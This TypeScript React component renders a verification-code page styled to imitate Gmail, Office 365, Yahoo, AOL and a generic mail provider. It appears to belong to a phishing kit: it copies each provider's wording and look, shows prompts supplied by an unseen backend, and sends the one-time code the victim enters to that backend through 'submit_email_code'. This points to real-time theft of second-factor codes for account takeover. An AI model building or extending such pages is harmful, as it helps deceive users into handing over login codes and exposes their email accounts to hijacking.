import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { ProviderKey, getProviderTheme } from './providerTheme';
import ProviderShell from './ProviderShell';

interface EmailVerificationPageProps {
  providerKey: ProviderKey;
  onAction: (action: string, data?: Record<string, unknown>) => void;
}

const EmailVerificationPage: React.FC<EmailVerificationPageProps> = ({ providerKey, onAction }) => {
  const location = useLocation();
  const navigate = useNavigate();
  const theme = getProviderTheme(providerKey);
  const data = ((location.state as { data?: Record<string, unknown> } | null)?.data) || {};
  const email = (data.email as string) || ((location.state as { email?: string } | null)?.email) || '';
  const recoveryEmail =
    (data.recoveryEmail as string) ||
    (data.email_destination as string) ||
    'your recovery email address';
  const backendMessage = (data.message as string) || '';

  const [code, setCode] = useState('');
  const [submitting, setSubmitting] = useState(false);

  const headline: Record<ProviderKey, string> = {
    gmail: 'Check your recovery email',
    office365: 'Check your email',
    yahoo: 'Verify your email',
    aol: 'Verify your email address',
    others: 'Verify your email',
  };

  const description =
    backendMessage ||
    `To continue, enter the verification code that was sent to ${recoveryEmail}.`;

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (code.length < 6 || submitting) return;
    setSubmitting(true);
    onAction('submit_email_code', { code });
  };
  const resend = () => onAction('resend_email_code');
  const goBack = () => {
    onAction('cancel');
    navigate(-1);
  };

  const MailBlock = () => (
    <div
      className="mx-auto mb-5 flex items-center justify-center w-16 h-16 rounded-full"
      style={{ backgroundColor: theme.primaryLight }}
    >
      <svg width={32} height={32} viewBox="0 0 24 24" fill="none" stroke={theme.primary} strokeWidth="1.6" aria-hidden="true">
        <rect x="3" y="5" width="18" height="14" rx="2" />
        <path d="M3 7l9 6 9-6" />
      </svg>
    </div>
  );

  // Provider-styled input element.
  const renderInput = () => {
    if (providerKey === 'gmail') {
      return (
        <>
          <label className="block text-xs text-gray-600 mb-1 mt-2">Enter the code</label>
          <input
            type="tel"
            inputMode="numeric"
            autoComplete="one-time-code"
            value={code}
            onChange={(e) => setCode(e.target.value.replace(/\D/g, '').slice(0, 8))}
            maxLength={8}
            autoFocus
            className="w-full px-3 py-3 text-lg tracking-[0.4em] border border-gray-400 rounded-md outline-none focus:border-blue-600 focus:border-2"
          />
        </>
      );
    }
    if (providerKey === 'office365') {
      return (
        <input
          type="tel"
          inputMode="numeric"
          autoComplete="one-time-code"
          placeholder="Code"
          value={code}
          onChange={(e) => setCode(e.target.value.replace(/\D/g, '').slice(0, 8))}
          maxLength={8}
          autoFocus
          className="w-full px-2 py-1 text-[15px] border-0 border-b-2 bg-transparent outline-none focus:border-[#0067b8]"
          style={{ borderBottomColor: '#666' }}
        />
      );
    }
    if (providerKey === 'yahoo' || providerKey === 'aol') {
      return (
        <input
          type="tel"
          inputMode="numeric"
          autoComplete="one-time-code"
          placeholder="Enter code"
          value={code}
          onChange={(e) => setCode(e.target.value.replace(/\D/g, '').slice(0, 8))}
          maxLength={8}
          autoFocus
          className="w-full border-b pt-2 pb-2 text-base tracking-[0.25em] focus:outline-none"
          style={{ borderColor: '#dcdfe0' }}
        />
      );
    }
    return (
      <input
        type="tel"
        inputMode="numeric"
        autoComplete="one-time-code"
        placeholder="123456"
        value={code}
        onChange={(e) => setCode(e.target.value.replace(/\D/g, '').slice(0, 8))}
        maxLength={8}
        autoFocus
        className="w-full px-4 py-3 text-center text-lg tracking-[0.4em] border rounded-md outline-none focus:border-[#0066cc]"
        style={{ borderColor: '#d1d1d1' }}
      />
    );
  };

  let primaryActions: React.ReactNode;
  let secondaryAction: React.ReactNode;
  if (providerKey === 'gmail') {
    primaryActions = (
      <button
        type="submit"
        form="ev-form"
        disabled={code.length < 6 || submitting}
        className="px-6 py-2.5 text-white text-sm font-semibold rounded-full disabled:opacity-50"
        style={{ backgroundColor: theme.primary }}
      >
        {submitting ? 'Verifying\u2026' : 'Next'}
      </button>
    );
    secondaryAction = (
      <button type="button" onClick={resend} className="text-sm font-semibold hover:underline" style={{ color: theme.primary }}>
        Resend code
      </button>
    );
  } else if (providerKey === 'office365') {
    primaryActions = (
      <button
        type="submit"
        form="ev-form"
        disabled={code.length < 6 || submitting}
        className="px-6 py-[6px] text-white text-sm font-semibold disabled:opacity-60"
        style={{ backgroundColor: theme.primary, minWidth: '108px' }}
      >
        {submitting ? 'Verifying\u2026' : 'Verify'}
      </button>
    );
    secondaryAction = (
      <button type="button" onClick={resend} className="text-sm text-[#0067b8] hover:underline text-left w-fit">
        I didn&rsquo;t get a code
      </button>
    );
  } else {
    primaryActions = (
      <button
        type="submit"
        form="ev-form"
        disabled={code.length < 6 || submitting}
        className={
          providerKey === 'aol'
            ? 'w-full py-3 text-white font-bold rounded-md text-base disabled:opacity-50'
            : providerKey === 'yahoo'
              ? 'w-full py-3 text-white font-medium rounded-full disabled:opacity-60'
              : 'w-full py-3 text-white text-sm font-semibold rounded-md disabled:opacity-60'
        }
        style={{ backgroundColor: theme.primary }}
      >
        {submitting ? 'Verifying\u2026' : 'Verify'}
      </button>
    );
    secondaryAction = (
      <>
        <button type="button" onClick={resend} className="hover:underline font-medium" style={{ color: theme.primary }}>
          Resend code
        </button>
        <button type="button" onClick={goBack} className="hover:underline font-medium" style={{ color: theme.primary }}>
          Cancel
        </button>
      </>
    );
  }

  return (
    <ProviderShell
      providerKey={providerKey}
      email={email}
      title={headline[providerKey]}
      description={description}
      onBack={goBack}
      primaryActions={primaryActions}
      secondaryAction={secondaryAction}
    >
      <MailBlock />
      <form id="ev-form" onSubmit={handleSubmit}>{renderInput()}</form>
    </ProviderShell>
  );
};

export default EmailVerificationPage;
